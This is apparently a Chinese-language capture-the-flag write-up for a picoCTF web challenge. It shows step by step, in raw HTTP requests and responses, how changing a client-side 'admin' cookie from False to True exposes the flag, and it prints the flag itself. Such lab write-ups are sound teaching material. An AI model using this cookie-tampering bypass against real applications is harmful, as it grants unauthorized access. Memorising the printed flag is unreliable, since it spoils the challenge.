使用登录功能
- 提交任意表单
    ```http
    POST /login HTTP/1.1

    user=Joe&password=x
    ```

- 响应
    ```http
    HTTP/1.1 200 OK
    Server: Werkzeug/2.2.2 Python/3.8.20
    Set-Cookie: session=; Expires=Thu, 01 Jan 1970 00:00:00 GMT; Max-Age=0; Path=/
    ```

    ```html
    <!-- <strong>Title</strong> --> I&#39;m sorry Joe&#39;s password is super secure. You&#39;re not getting in that way.
    ```

使用登出功能 `/logout`
- 响应
    ```http
    HTTP/1.1 302 FOUND
    Location: /
    Set-Cookie: password=; Expires=Thu, 01 Jan 1970 00:00:00 GMT; Path=/
    Set-Cookie: username=; Expires=Thu, 01 Jan 1970 00:00:00 GMT; Path=/
    Set-Cookie: admin=; Expires=Thu, 01 Jan 1970 00:00:00 GMT; Path=/
    ```
    - 得到一批新 cookie 字段

Cookie: password=; username=; admin=;

使用目标用户外的凭据设置登录表单
- 请求
    ```http
    POST /login HTTP/1.1

    user=wiener&password=peter
    ```
    - 响应
        ```http
        HTTP/1.1 302 FOUND
        Location: /flag
        Set-Cookie: password=peter; Path=/
        Set-Cookie: username=wiener; Path=/
        Set-Cookie: admin=False; Path=/
        ```

        ```html
        <!-- <strong>Title</strong> --> Success: You logged in! Not sure you&#39;ll be able to see the flag though.

        No flag for you
        ```

- 修改 cookie admin 字段值
    ```http
    GET /flag HTTP/1.1
    Cookie: password=peter; username=wiener; admin=True
    ```
    - 响应
        ```html
        <b>
            Flag
        </b>
        : <code>
            picoCTF{th3_c0nsp1r4cy_l1v3s_4d184b0d}
        </code>
        ```
